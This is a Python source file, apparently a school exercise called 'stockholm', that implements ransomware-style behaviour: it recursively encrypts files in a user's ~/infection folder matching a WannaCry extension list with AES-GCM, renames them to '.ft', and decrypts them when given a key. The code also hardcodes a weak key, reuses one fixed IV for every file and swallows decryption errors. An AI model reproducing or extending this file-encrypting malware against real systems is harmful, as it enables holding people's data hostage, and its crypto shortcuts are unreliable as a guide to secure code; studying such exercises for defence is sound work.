import argparse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from pathlib import Path
from colorama import Fore, Style
import os

KEY = b'123hellowOrld123'
# os.urandom(16+)
SALT = b'\xbeRz\x1a\xc5T[\xef\x80\xbd\xc6\x88\x19\x06\x9d\xca'
# os.urandom(12)
IV = b'W\xf4\xb3\xa9\x05\xa4\xe7\xdf\xd9\xae\x9e\xa0'
EXTENSION = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm",
    ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", "sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd",
    ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".psl",
    ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3",
    ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv",
    ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png",
    ".bmp", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
    ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".edb", ".potm", ".potx",
    ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
    ".dotx", ".dotm", ".dot", ".docm", ".docb", ".jpg", "jpeg", ".snt", ".onetoc2", ".dwg", ".pdf", ".wkl", ".wks", ".123",
    ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".eml", ".msg", ".ost", ".pst", ".pptx", ".ppt", ".xlsx", ".xls", ".docx", ".doc"
    ]

#TODO • It must be developed for the Linux platform.
#       option "–help" or "-h" to display the help.
#       option "–version" or "-v" to show the version of
#       option "–reverse" or "-r" followed by the key entered as an argument to reverse the infection.
#       option is indicated "–silent" or "-s", in which case the program will not produce any output.
#TODO • The program have to handle errors and will not stop unexpectedly in any case.

#TODO • It must only work in a folder called infection in the user’s HOME directory.
#TODO • The program will only act on files whose extensions have been affected by Wannacry
#TODO • The program have to encrypt the contents of the files in this folder using a key
#TODO • Files must be encrypted with a known algorithm of your choice, which is considered secure.
#TODO • The program must rename all the files in the mentioned folder adding the ".ft" extension.
#TODO • If they already have this extension, they will not be renamed.
#TODO • The key with which the files are encrypted will be at least 16 characters long.
#TODO • The program must be able to do the reverse operation using the encryption key in order to restore the files to their original state.

#TODO • You must add a file of maximum 50 lines called README.md to the root of your
#TODO repository. This file should contain instructions for use and, if necessary, for compilation.
#TODO • You must add to the root of your repository a Makefile to configure the files so that
#TODO the program can be run.
#TODO • In any case, you must include all the source code of the program.

def main() -> int:
    try:
        called_path = Path('.')
        if not called_path.cwd() in [Path("/home/infection"), Path("~/infection"), Path(os.environ["HOME"] + "/infection")]:
            return error("invalid called path directory.", 1)
        args = arguments_parser()
        if args.reverse:
            if len(args.reverse) < 16 : return error("Invalid key format.", 1)
            recusive_directory_and(decryption, called_path, args.silent, args.reverse.encode('utf-8'))
        else:
            recusive_directory_and(encryption, called_path, args.silent, KEY)
    except Exception as e:
        return error(e, 1)
    except KeyboardInterrupt:
        return 1
    return 0

def key_derivation(key: str):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                    length=32,
                    salt=SALT,
                    iterations=100_000, 
                    )
    return kdf.derive(key)

def recusive_directory_and(func, directory: Path, silent: bool, key: str) -> None:
    for item in directory.iterdir():
        if item.is_file():
            func(item, key)
        else:
            print(f"{Fore.YELLOW}[directory]{Style.RESET_ALL} {item.absolute()}")
            recusive_directory_and(func, item, silent, key)

def encryption(file: Path, key: str):
    try:
        if (file.suffix in EXTENSION):
            hkey = key_derivation(key)
            with open(file, 'br') as f:
                content = f.read()
            cipher = AESGCM(hkey)
            encrypted = cipher.encrypt(IV, content, None)
            with open(file, 'bw') as f:
                f.write(encrypted);
            print(f"{Fore.BLUE}[encrytped] {Fore.GREEN}{file.name}{Style.RESET_ALL} -> {Fore.RED}{file.name}.ft{Style.RESET_ALL}")
            file.rename(f"{file.absolute()}.ft")
    except Exception as e:
        return error(e, 1);
    return

def decryption(file, key):
    try:
        if (file.suffix == ".ft"):
            hkey = key_derivation(key)
            with open(file, 'br') as f:
                encrypted = f.read()
            cipher = AESGCM(hkey)
            content = cipher.decrypt(IV, encrypted, None)
            with open(file, 'bw') as f:
                f.write(content)
            file_name = str(file.absolute())[:-3];
            file.rename(file_name)
            print(f"{Fore.BLUE}[encrytped] {Fore.RED}{file.name}{Style.RESET_ALL} -> {Fore.GREEN}{file.name[:-3]}{Style.RESET_ALL}")
    except Exception as e:
        pass
    return

def arguments_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="stockholm", 
                                        description="this program are ....", )
    parser.add_argument("-v", "--version", action="version", version="%(prog)s v.1.0.1",
                        help=": show to version of the programe.")
    parser.add_argument("-s", "--silent", action="store_true",
                        help=": " )
    parser.add_argument("-r", "--reverse", type=str, metavar="KEY",
                        help=": hello")# follow by key as argument.
    return parser.parse_args()


def error(message: str, code: int=None):
    print(f"stockholm: error: {message}")
    return code

if __name__ == "__main__":
    main()